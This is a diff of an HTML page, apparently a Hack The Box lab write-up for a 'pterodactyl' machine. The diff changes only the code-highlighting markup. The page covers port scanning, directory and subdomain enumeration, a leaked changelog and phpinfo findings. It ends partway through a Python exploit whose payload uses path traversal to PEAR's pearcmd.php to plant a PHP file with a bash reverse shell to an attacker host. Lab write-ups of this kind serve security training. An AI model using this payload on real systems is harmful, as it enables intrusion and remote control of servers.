@@ -986,24 +986,24 @@
     
 </h4>
 <p>I started with a fast port scan to identify open services:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="gp">$</span> nmap 10.129.14.17 -p- -A --min-rate <span class="m">5000</span>                  
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 14:23 UTC
-</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="go">Nmap scan report for pterodactyl.htb (10.129.14.17)
-</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="go">Host is up (0.025s latency).
-</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="go">Not shown: 65531 closed tcp ports (reset)
-</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="go">PORT     STATE  SERVICE    VERSION
-</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="go">22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
-</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="go">| ssh-hostkey: 
-</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="go">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
-</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="go">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
-</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="go">80/tcp   open   http       nginx 1.21.5
-</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="go">|_http-title: Did not follow redirect to http://pterodactyl.htb/
-</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="go">|_http-server-header: nginx/1.21.5
-</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="go">443/tcp  closed https
-</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="go">8080/tcp closed http-proxy
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>$ nmap 10.129.14.17 -p- -A --min-rate <span style="color:#ae81ff">5000</span>                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 14:23 UTC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>Nmap scan report for pterodactyl.htb (10.129.14.17)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>Host is up (0.025s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>Not shown: 65531 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>PORT     STATE  SERVICE    VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>80/tcp   open   http       nginx 1.21.5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>|_http-title: Did not follow redirect to http://pterodactyl.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>|_http-server-header: nginx/1.21.5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>443/tcp  closed https
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>8080/tcp closed http-proxy
+</span></span></code></pre></div></div>
 <p>The web server redirected to <code>pterodactyl.htb</code>, so I added it to my hosts file:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> <span class="s2">&#34;10.129.14.17    pterodactyl.htb&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ echo <span style="color:#e6db74">&#34;10.129.14.17    pterodactyl.htb&#34;</span> | sudo tee -a /etc/hosts
 </span></span></code></pre></div></div>
 
 <h4 class="relative group">directory enumeration
@@ -1016,23 +1016,23 @@
     
 </h4>
 <p>I ran gobuster to discover hidden files and directories:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="gp">$</span> gobuster dir -u http://pterodactyl.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t <span class="m">50</span>
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="go">===============================================================
-</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="go">Gobuster v3.6
-</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="go">===============================================================
-</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="go">[+] Url:                     http://pterodactyl.htb/
-</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="go">[+] Method:                  GET
-</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="go">[+] Threads:                 50
-</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="go">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
-</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="go">[+] Extensions:              php,txt,html
-</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="go">===============================================================
-</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="go">Starting gobuster scan
-</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="go">===============================================================
-</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="go">/changelog.txt        (Status: 200) [Size: 920]
-</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="go">/index.php            (Status: 200) [Size: 1686]
-</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="go">/phpinfo.php          (Status: 200) [Size: 73006]
-</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="go">===============================================================
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>$ gobuster dir -u http://pterodactyl.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>===============================================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>===============================================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>[+] Url:                     http://pterodactyl.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>[+] Threads:                 50
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>[+] Extensions:              php,txt,html
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>===============================================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>Starting gobuster scan
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>===============================================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>/changelog.txt        (Status: 200) [Size: 920]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>/index.php            (Status: 200) [Size: 1686]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>/phpinfo.php          (Status: 200) [Size: 73006]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>===============================================================
+</span></span></code></pre></div></div>
 <p>The presence of <code>phpinfo.php</code> suggested a development or misconfigured environment that might leak useful information.</p>
 
 <h4 class="relative group">subdomain enumeration
@@ -1045,15 +1045,15 @@
     
 </h4>
 <p>Given the domain-based routing, I scanned for virtual hosts:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> gobuster vhost -u http://pterodactyl.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t <span class="m">50</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">===============================================================
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">Found: panel.pterodactyl.htb Status: 200 [Size: 1897]
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">===============================================================
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ gobuster vhost -u http://pterodactyl.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>===============================================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>Found: panel.pterodactyl.htb Status: 200 [Size: 1897]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>===============================================================
+</span></span></code></pre></div></div>
 <p>I added this subdomain to my hosts file:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> tail -1 /etc/hosts
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">10.129.14.17    pterodactyl.htb panel.pterodactyl.htb
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ tail -1 /etc/hosts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>10.129.14.17    pterodactyl.htb panel.pterodactyl.htb
+</span></span></code></pre></div></div>
 
 <h4 class="relative group">web-site
     <div id="web-site" class="anchor"></div>
@@ -1079,34 +1079,34 @@
     data-zoom-src="/investigations/htb-pterodactyl/image.png"></figure>
 </p>
 <p>A changelog file that contained infrastructure details:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">MonitorLand - CHANGELOG.txt
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl">======================================
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Version 1.20.X
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">[Added] Main Website Deployment
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">--------------------------------
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">- Deployed the primary landing site for MonitorLand.
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">- Implemented homepage, and link for Minecraft server.
-</span></span><span class="line"><span class="ln">10</span><span class="cl">- Integrated site styling and dark-mode as primary.
-</span></span><span class="line"><span class="ln">11</span><span class="cl">
-</span></span><span class="line"><span class="ln">12</span><span class="cl">[Linked] Subdomain Configuration
-</span></span><span class="line"><span class="ln">13</span><span class="cl">--------------------------------
-</span></span><span class="line"><span class="ln">14</span><span class="cl">- Added DNS and reverse proxy routing for play.pterodactyl.htb.
-</span></span><span class="line"><span class="ln">15</span><span class="cl">- Configured NGINX virtual host for subdomain forwarding.
-</span></span><span class="line"><span class="ln">16</span><span class="cl">
-</span></span><span class="line"><span class="ln">17</span><span class="cl">[Installed] Pterodactyl Panel v1.11.10
-</span></span><span class="line"><span class="ln">18</span><span class="cl">--------------------------------------
-</span></span><span class="line"><span class="ln">19</span><span class="cl">- Installed Pterodactyl Panel.
-</span></span><span class="line"><span class="ln">20</span><span class="cl">- Configured environment:
-</span></span><span class="line"><span class="ln">21</span><span class="cl">  - PHP with required extensions.
-</span></span><span class="line"><span class="ln">22</span><span class="cl">  - MariaDB 11.8.3 backend.
-</span></span><span class="line"><span class="ln">23</span><span class="cl">
-</span></span><span class="line"><span class="ln">24</span><span class="cl">[Enhanced] PHP Capabilities
-</span></span><span class="line"><span class="ln">25</span><span class="cl">-------------------------------------
-</span></span><span class="line"><span class="ln">26</span><span class="cl">- Enabled PHP-FPM for smoother website handling on all domains.
-</span></span><span class="line"><span class="ln">27</span><span class="cl">- Enabled PHP-PEAR for PHP package management.
-</span></span><span class="line"><span class="ln">28</span><span class="cl">- Added temporary PHP debugging via phpinfo()</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>MonitorLand - CHANGELOG.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>======================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>Version 1.20.X
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>[Added] Main Website Deployment
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>--------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>- Deployed the primary landing site for MonitorLand.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>- Implemented homepage, and link for Minecraft server.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>- Integrated site styling and dark-mode as primary.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>[Linked] Subdomain Configuration
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>--------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>- Added DNS and reverse proxy routing for play.pterodactyl.htb.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>- Configured NGINX virtual host for subdomain forwarding.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>[Installed] Pterodactyl Panel v1.11.10
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>--------------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>- Installed Pterodactyl Panel.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>- Configured environment:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>  - PHP with required extensions.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>  - MariaDB 11.8.3 backend.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>[Enhanced] PHP Capabilities
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>-------------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>- Enabled PHP-FPM for smoother website handling on all domains.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>- Enabled PHP-PEAR for PHP package management.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>- Added temporary PHP debugging via phpinfo()</span></span></code></pre></div></div>
 <p>This revealed some informations:<br>
 - Pterodactyl Panel v1.11.10 was installed<br>
 - MariaDB 11.8.3 was the database backend<br>
@@ -1123,14 +1123,14 @@
     
 </h4>
 <p>I checked <code>phpinfo.php</code> to understand the PHP environment configuration:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">disable_functions</span>    <span class="nx">no</span> <span class="nx">value</span>    
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nx">open_basedir</span>         <span class="nx">no</span> <span class="nx">value</span>      
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#a6e22e">disable_functions</span>    <span style="color:#a6e22e">no</span> <span style="color:#a6e22e">value</span>    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#a6e22e">open_basedir</span>         <span style="color:#a6e22e">no</span> <span style="color:#a6e22e">value</span>      
 </span></span></code></pre></div></div>
 <p>Both security directives were empty, which meant:<br>
 - No restrictions existed on dangerous PHP functions like <code>system()</code>, <code>exec()</code>, or <code>shell_exec()</code><br>
 - Full filesystem traversal was possible with no directory restrictions</p>
 <p>The PHP environment also showed:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">include_path</span>    <span class="o">.:/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">php8</span><span class="o">:/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="nx">PEAR</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#a6e22e">include_path</span>    <span style="color:#f92672">.:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">share</span><span style="color:#f92672">/</span><span style="color:#a6e22e">php8</span><span style="color:#f92672">:/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">share</span><span style="color:#f92672">/</span><span style="color:#a6e22e">php</span><span style="color:#f92672">/</span><span style="color:#a6e22e">PEAR</span></span></span></code></pre></div></div>
 <p>This confirmed PHP-PEAR was installed at <code>/usr/share/php/PEAR</code>, which would be critical for exploitation since PEAR&rsquo;s <code>pearcmd.php</code> could be abused to write arbitrary PHP files.</p>
 
 <h4 class="relative group">login panel
@@ -1195,57 +1195,57 @@
     
 </h4>
 <p>I created a Python exploit script that automated the attack:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">):</span>
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="c1"># Payload: traverse to PEAR and inject PHP code through auto_prepend_file</span>
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;../../../../../../../../usr/share/php/PEAR/pearcmd&amp;+config-create+/&amp;&lt;?=`bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">lhost</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">lport</span><span class="si">}</span><span class="s2"> 0&gt;&amp;1&#39;`?&gt;+/tmp/shell.php&#34;</span>
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    
-</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/locales/locale.json&#34;</span>
-</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
-</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="s2">&#34;locale&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
-</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="s2">&#34;namespace&#34;</span><span class="p">:</span> <span class="s2">&#34;anything&#34;</span>
-</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="ln">15</span><span class="cl">    
